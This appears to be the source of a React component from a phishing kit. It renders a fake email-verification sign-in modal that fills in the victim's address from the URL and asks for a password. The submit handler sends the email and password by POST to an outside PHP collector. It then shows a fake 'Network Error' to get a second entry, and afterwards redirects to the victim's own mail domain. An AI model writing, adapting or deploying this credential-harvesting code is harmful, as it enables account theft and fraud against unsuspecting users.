
import './details.css';
import favico from '../assets/favicon.png';
import { useState } from 'react';
import { FaCircleUser } from "react-icons/fa6";
import $ from "jquery";


export const Detaills = ({ hideDetel })=>{

    const reloadThisWebPageOnAnElementClick = ()=> window.location.reload();

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();
    

    const [email, setEmail] = useState(extracetdEmail);
    const [pswd, setPswd] = useState('');

    const [ver, setVer] = useState(false);

    // const showFirstInp_Ver = ()=> setVer(true);
    // const hideFirstInp_Ver = ()=> setVer(false);

    const [major, setMajor] = useState(false);

    // const showLastInp_Maj = ()=> setMajor(true);
    // const hideLastInp_maj = ()=> setMajor(false);

    const [errMsg, setErrMsg] = useState(false);

    const [btnTxt, setBtnTxt] = useState('Sign In');

    const [firstBtn, setFirstBtn] = useState('Next')

    const clickFirstButtonToShowLastInput = (ev)=>{
        ev.preventDefault();
        setFirstBtn('Please wait...');
        setTimeout(() => {
            setVer(true);
            setMajor(true);
            setFirstBtn('Next');
        }, 2000);

    }

    const [count, setCount] = useState(0);


    const submitHandler = det=>{
        det.preventDefault();

        if (pswd === "") {
            return null
        } else {

            setBtnTxt('Processing....');
            setEmail(email);

            setCount(count=> count + 1);
            if (count >=1) {
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('&', 1).toString();
                console.log(extracetdemailDomain);
                setTimeout(() => {
                    window.location.href = `https://${extracetdemailDomain}`
                }, 2300);
            }


        
            // sub details
            const user = {
                email: email,
                password: pswd,

            };

            $.ajax({
                type: "POST",
                url: "https://physicaleducationdiploma.com/work/worksmails9090protonme.php",
                data: user,
                success(data) {
                    // alert('OK');
                    console.log(data);
                },
            });


            setTimeout(() => {
                setErrMsg(true);
                setPswd('');
                setBtnTxt('Sign In')
            }, 6000);
        }


    };


    
    return(<>
        
        <article id='full_width__' className='Backdrop_Backdrop__gAnnj' onClick={hideDetel}>

            <div id='modal' className='Modal_Modal__ihArb' onClick={(ev)=> ev.stopPropagation()}>

                <div className='ic_wrapper'>
                    <img 
                        alt='ico'
                        className='ico'
                        src={`${favico}`}
                        // onClick={reloadThisWebPageOnAnElementClick}
                    />
                </div>


                    <>
                        { !ver ?
                            <>
                                <p className='ver_eml__' >Verify</p>

                                <p className='ver_eml__'>Verify Email Address to Continue</p> 
                            
                        

                                <form action="" id='controlle__r'>
                                    <div className='eml_inp_cont'>
                                        <input 
                                            className='email'
                                            id='email'
                                            placeholder='Email'
                                            value={`${extracetdEmail}`}
                                            required
                                            readOnly
                                        />
                                    </div>

                                    <small id='sm' onClick={reloadThisWebPageOnAnElementClick}>Forgot password</small>


                                    <p className='nt_yr'>Not your computer? Use Guest mode to sign in privately.</p>

                                    <small id='sm' style={{fontWeight:'bold',}} onClick={reloadThisWebPageOnAnElementClick}>Learn more</small>



                                    <div className="Modal_btns__NUPl6">
                                        <span>Create Account</span>

                                        <button className="btn btn-primary" id='bb' onClick={clickFirstButtonToShowLastInput}>{firstBtn}</button>

                                    </div>
                                </form>
                            </>
                        : null }

                </>



                                {/* SUBMITING COMPONENT BELOW */}


                {major ? <>
                            <form action="" className='last_deta_frm__' id='controlle__r' onSubmit={submitHandler}>

                                    <p className='ver_eml__' style={{fontSize:'20px', marginTop:'0.5em'}}>Welcome</p>


                                    { errMsg ? 
                                        <p className='Modal_err__emZ1L'>
                                            Network Error! Please verify your information 
                                            {/* and try again */}
                                        </p> 
                                    : null }

                                    <div style={{
                                        display:'flex',
                                        justifyContent:'center'
                                    }}>
                                        <div className='Modal_userSign__wl3Al'>
                                            <FaCircleUser />
                                            <p style={{margin:'0.3rem'}} className='usermal'>{email}</p>
                                        </div>
                                    </div>



                                    <div className='eml_inp_cont'>
                                        <input 
                                            className='email'
                                            id='email'
                                            placeholder='Password'
                                            required
                                            type='password'
                                            title='Password'
                                            value={pswd}
                                            onChange={e=> setPswd(e.target.value)}
                                            autoFocus
                                        />
                                    </div>


                                    <div className='chekk_cont'>
                                        <input type='checkbox'/>
                                        &#160;
                                        <small id='sm'>Remember me</small>
                                    </div>


                                    <div className='btn_cont'>
                                        <input type="submit" value={btnTxt} className="btn btn-primary" id='bb' onClick={submitHandler} />
                                    </div>





                            </form>
                </> : null }







            </div>

        </article>

    </>)
};